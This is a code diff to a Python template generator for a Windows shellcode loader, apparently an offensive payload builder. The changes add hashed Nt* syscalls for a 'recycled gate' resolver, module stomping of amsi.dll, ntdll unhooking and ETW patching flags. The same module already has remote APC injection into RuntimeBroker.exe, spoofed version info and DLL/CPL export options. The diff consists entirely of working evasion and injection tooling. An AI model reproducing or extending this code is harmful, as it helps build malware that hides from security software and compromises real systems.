@@ -45,7 +45,8 @@ def _get_api_hashes():
         "NtCreateSection", "NtMapViewOfSection", "SleepEx", "NtCreateJobObject",
         "NtSetInformationJobObject", "NtAssignProcessToJobObject",
         "GetComputerNameA",
-        "LsaOpenPolicy", "LsaQueryInformationPolicy", "LsaFreeMemory", "LsaClose"
+        "LsaOpenPolicy", "LsaQueryInformationPolicy", "LsaFreeMemory", "LsaClose",
+        "NtQueryVirtualMemory", "NtProtectVirtualMemory"
     ]
     module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL", "ADVAPI32.DLL"]
     
@@ -90,12 +91,11 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
     elif api_resolver_choice == 'recycled_gate':
         # Standard hashes are still needed for some Kernel32 functions (like LoadLibrary/GetProcAddress for initial setup if needed, or fallback)
         template_vars.update(_get_api_hashes())
-        # Add Recycled Gate specific hashes (XORed)
-        # We need the Nt* equivalents of the functions we use.
         rg_api_names = [
             "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtCreateThreadEx", 
             "NtWaitForSingleObject", "NtCreateSection", "NtMapViewOfSection", 
-            "NtWriteVirtualMemory", "NtQueueApcThread", "NtClose", "NtFreeVirtualMemory"
+            "NtWriteVirtualMemory", "NtQueueApcThread", "NtClose", "NtFreeVirtualMemory",
+            "NtQueryVirtualMemory"
         ]
         for name in rg_api_names:
             template_vars[f"hash_rg_{name.lower()}"] = _djb2_hash_xor(name)
@@ -126,20 +126,32 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
         template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
 
     output_format = options.get('output_format', 'exe')
-    allocation_method_choice = options.get('allocation_method', 'virtualalloc')
+    
+    allocation_method_choice = options.get('memory_strategy') or options.get('allocation_method', 'virtualalloc')
+    
     execution_method_choice = options.get('execution_method', 'newthread')
 
     template_vars.update({
         'allocation_method': allocation_method_choice,
         'execution_method': execution_method_choice,
-        'allocation_partial': f"partials/alloc_{allocation_method_choice}.c.j2",
+        'memory_strategy': allocation_method_choice,
+        'allocation_partial': f"partials/alloc_{allocation_method_choice}.c.j2", # Kind of legacy, base.c.j2 logic overrides it now TODO: CHECK AND FIX
         'execution_partial': f"partials/exec_{execution_method_choice}.c.j2",
         'output_format': output_format,
         'export_name': 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer'),
         'debug_mode': (options.get('debug_mode') == 'true'),
         'bytecode_transformation': options.get('bytecode_encoding'),
-        'bytecode_compression': options.get('bytecode_compression')
+        'bytecode_compression': options.get('bytecode_compression'),
+        'drip_delay': options.get('drip_delay', 100),
+        'stomp_dll_path': options.get('stomp_dll_path', r'C:\Windows\System32\amsi.dll').replace('\\', '\\\\')
     })
+
+    evasion_features = options.get('evasion_features', [])
+    if isinstance(evasion_features, str):
+         evasion_features = evasion_features.split(',')
+         
+    template_vars['evasion_unhook'] = 'unhook_ntdll' in evasion_features
+    template_vars['evasion_etw'] = 'patch_etw' in evasion_features
 
     if execution_method_choice == 'remoteapc':
         target_process = options.get('target_process', 'RuntimeBroker.exe')
@@ -167,7 +179,6 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
                 if key == 'name': continue
                 final_version_info[f'version_info_{key}'] = selected_template.get(key, '')
 
-    # Apply overrides from options (or full custom if no template)
     has_custom_data = False
     for key in sample_template.keys():
         if key == 'name': continue
@@ -195,7 +206,6 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
             if key not in ['version_info_file_version', 'version_info_product_version']:
                  template_vars[key] = val
     
-    # --- Guardrails Processing ---
     guardrail_domain_joined = (options.get('guardrail_domain_joined') == 'true')
     guardrail_hostname = options.get('guardrail_hostname', '')
     
